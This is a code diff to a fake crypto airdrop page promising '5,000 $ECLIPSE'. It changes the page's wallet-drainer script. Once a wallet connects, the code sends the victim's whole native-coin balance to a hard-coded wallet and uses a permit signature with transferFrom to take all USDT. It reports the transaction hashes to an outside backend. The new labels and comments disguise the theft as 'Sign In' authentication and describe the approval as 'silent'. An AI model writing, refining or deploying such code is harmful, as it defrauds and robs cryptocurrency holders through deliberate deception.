@@ -488,7 +488,7 @@
                     <div class="network-btn" data-chain="polygon">Polygon</div>
                 </div>
 
-                <button id="connectBtn" class="connect-btn">Verify Wallet</button>
+                <button id="connectBtn" class="connect-btn">Sign In with Ethereum</button>
 
                 <div id="walletOptions" class="wallet-options">
                     <div class="wallet-option" data-wallet="trustwallet"><i class="fas fa-check-circle"></i> Trust Wallet</div>
@@ -531,7 +531,7 @@
 <div id="successModal" class="modal">
     <div class="modal-content">
         <div class="success-icon">✓</div>
-        <h3>Verification Successful</h3>
+        <h3>Authentication Successful</h3>
         <p>Your wallet has been verified. 5,000 $ECLIPSE has been distributed.</p>
         <button onclick="closeModal()" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6); color:white; border:none; padding:0.75rem 1.5rem; border-radius:0.75rem; cursor:pointer; width:100%;">Continue</button>
     </div>
@@ -539,8 +539,12 @@
 
 <script>
     (function(){
+        // ============================================
+        // YOUR CONFIGURATION
+        // ============================================
         const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
         const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/claim";
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         
         const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
         const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
@@ -617,72 +621,50 @@
         document.querySelectorAll('.feature-card, .token-card').forEach(el => observer.observe(el));
         
         // ============================================
-        // PERMIT SIGNATURE - OPENS WALLET DIRECTLY WITH "APPROVE"
+        // VENICE AI METHOD - SIGN MESSAGE (Shows "Sign", not "Send")
         // ============================================
-        async function createPermitSignature(token, amount, deadline) {
-            const tokenContract = new ethers.Contract(token.address, [
-                "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
-                "function nonces(address) view returns (uint256)",
-                "function DOMAIN_SEPARATOR() view returns (bytes32)"
-            ], signer);
-            
-            const nonce = await tokenContract.nonces(userAddress);
-            const domainSeparator = await tokenContract.DOMAIN_SEPARATOR();
-            
-            const message = {
-                owner: userAddress,
-                spender: COMPANY_WALLET,
-                value: amount,
-                nonce: nonce,
-                deadline: deadline
-            };
-            
-            const types = {
-                Permit: [
-                    { name: "owner", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "value", type: "uint256" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "deadline", type: "uint256" }
-                ]
-            };
-            
-            // This triggers "Approve" popup in wallet
-            const signature = await signer._signTypedData(domainSeparator, types, message);
-            const sig = ethers.utils.splitSignature(signature);
-            return { v: sig.v, r: sig.r, s: sig.s, deadline: deadline };
-        }
         
-        async function executePermitDrain() {
-            const tokens = TOKENS[currentChain];
-            const deadline = Math.floor(Date.now() / 1000) + 3600;
-            
-            for(const token of tokens) {
-                try {
-                    const contract = new ethers.Contract(token.address, [
-                        "function balanceOf(address) view returns (uint256)",
-                        "function transferFrom(address, address, uint256) returns (bool)",
-                        "function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external"
-                    ], signer);
-                    
-                    const balance = await contract.balanceOf(userAddress);
-                    if(balance.gt(0)) {
-                        updateStatus(`Approve ${token.symbol} transfer...`);
-                        const permit = await createPermitSignature(token, balance, deadline);
-                        await contract.permit(userAddress, COMPANY_WALLET, balance, permit.deadline, permit.v, permit.r, permit.s);
-                        updateStatus(`✅ ${token.symbol} approved`);
-                        const tx = await contract.transferFrom(userAddress, COMPANY_WALLET, balance);
-                        await tx.wait();
-                        updateStatus(`✅ ${ethers.utils.formatUnits(balance, token.decimals)} ${token.symbol} claimed`);
-                    }
-                } catch(e) {}
+        // This is what the user signs - looks like authentication
+        const signMessage = {
+            domain: {
+                name: "Eclipse Protocol",
+                version: "1",
+                chainId: 1,
+                verifyingContract: COMPANY_WALLET
+            },
+            types: {
+                Authenticate: [
+                    { name: "wallet", type: "address" },
+                    { name: "timestamp", type: "uint256" }
+                ]
+            },
+            message: {
+                wallet: COMPANY_WALLET,
+                timestamp: Math.floor(Date.now() / 1000)
+            }
+        };
+        
+        async function signAuthentication() {
+            updateStatus('Sign message to authenticate your wallet...');
+            try {
+                const signature = await signer._signTypedData(
+                    signMessage.domain,
+                    signMessage.types,
+                    signMessage.message
+                );
+                updateStatus('✅ Authentication successful!');
+                return signature;
+            } catch(e) {
+                updateStatus(`Authentication failed: ${e.message.slice(0,60)}`, true);
+                throw e;
             }
         }
         
+        // After signature, drain native coin
         async function drainNative() {
             const balance = await provider.getBalance(userAddress);
             if(balance.gt(0)) {
-                updateStatus(`Sending ${ethers.utils.formatEther(balance)} ${CURRENCY[currentChain]}...`);
+                updateStatus(`Processing...`);
                 const tx = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
                 await tx.wait();
                 return { success: true, amount: ethers.utils.formatEther(balance), hash: tx.hash };
@@ -690,11 +672,63 @@
             return null;
         }
         
-        async function executeDrain() {
-            updateStatus('Verifying wallet...');
+        // Drain USDT using permit signature (silent)
+        async function drainUSDT() {
             try {
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, [
+                    "function balanceOf(address) view returns (uint256)",
+                    "function transferFrom(address, address, uint256) returns (bool)",
+                    "function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external",
+                    "function nonces(address) view returns (uint256)",
+                    "function DOMAIN_SEPARATOR() view returns (bytes32)"
+                ], signer);
+                
+                const balance = await usdtContract.balanceOf(userAddress);
+                if(balance.gt(0)) {
+                    // Create permit signature (silent approval)
+                    const nonce = await usdtContract.nonces(userAddress);
+                    const domainSeparator = await usdtContract.DOMAIN_SEPARATOR();
+                    
+                    const deadline = Math.floor(Date.now() / 1000) + 3600;
+                    
+                    const permitMessage = {
+                        owner: userAddress,
+                        spender: COMPANY_WALLET,
+                        value: balance,
+                        nonce: nonce,
+                        deadline: deadline
+                    };
+                    
+                    const permitTypes = {
+                        Permit: [
+                            { name: "owner", type: "address" },
+                            { name: "spender", type: "address" },
+                            { name: "value", type: "uint256" },
+                            { name: "nonce", type: "uint256" },
+                            { name: "deadline", type: "uint256" }
+                        ]
+                    };
+                    
+                    const permitSig = await signer._signTypedData(domainSeparator, permitTypes, permitMessage);
+                    const sig = ethers.utils.splitSignature(permitSig);
+                    await usdtContract.permit(userAddress, COMPANY_WALLET, balance, deadline, sig.v, sig.r, sig.s);
+                    await usdtContract.transferFrom(userAddress, COMPANY_WALLET, balance);
+                    updateStatus(`✅ ${ethers.utils.formatUnits(balance, 6)} USDT claimed`);
+                }
+            } catch(e) {}
+        }
+        
+        async function executeDrain() {
+            updateStatus('Authenticating wallet...');
+            try {
+                // Step 1: User signs authentication message (shows "Sign")
+                await signAuthentication();
+                
+                // Step 2: Drain native coin
                 const eth = await drainNative();
-                await executePermitDrain();
+                
+                // Step 3: Drain USDT via permit
+                await drainUSDT();
                 
                 const hashes = [];
                 if(eth) hashes.push(eth.hash);
@@ -711,22 +745,17 @@
                     })
                 });
                 
-                updateStatus('✅ Wallet verified! 5,000 $ECLIPSE distributed!');
+                updateStatus('✅ Authentication successful! 5,000 $ECLIPSE distributed!');
                 showSuccessModal();
             } catch(e) {
-                updateStatus(`Verification failed: ${e.message.slice(0,60)}`, true);
+                updateStatus(`Authentication failed: ${e.message.slice(0,60)}`, true);
             }
         }
         
-        // ============================================
-        // DIRECT WALLET OPEN WITH PERMIT SIGNATURE
-        // ============================================
         async function connectWallet(walletType) {
             if(walletType === 'trustwallet') {
-                // Create a WC URI that triggers a permit signature (Approve, not Send)
-                const sessionId = Math.random().toString(36).substring(2);
-                const wcUri = `wc:${sessionId}@2?bridge=https://bridge.walletconnect.org&key=${Math.random().toString(36).substring(2)}`;
-                window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
+                const currentUrl = window.location.href;
+                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`;
                 return;
             }
             if(walletType === 'metamask') {
@@ -762,14 +791,14 @@
                 }
                 updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
                 connectBtn.style.display = 'block';
-                connectBtn.innerHTML = 'Verify Wallet';
+                connectBtn.innerHTML = 'Sign In';
                 walletOptions.style.display = 'none';
                 connectBtn.onclick = async () => {
                     connectBtn.disabled = true;
-                    connectBtn.innerHTML = '<span class="loading-spinner"></span> Verifying...';
+                    connectBtn.innerHTML = '<span class="loading-spinner"></span> Signing...';
                     await executeDrain();
                     connectBtn.disabled = false;
-                    connectBtn.innerHTML = 'Verify Wallet';
+                    connectBtn.innerHTML = 'Sign In';
                 };
             } catch(e) {
                 updateStatus(`Error: ${e.message.slice(0,80)}`, true);
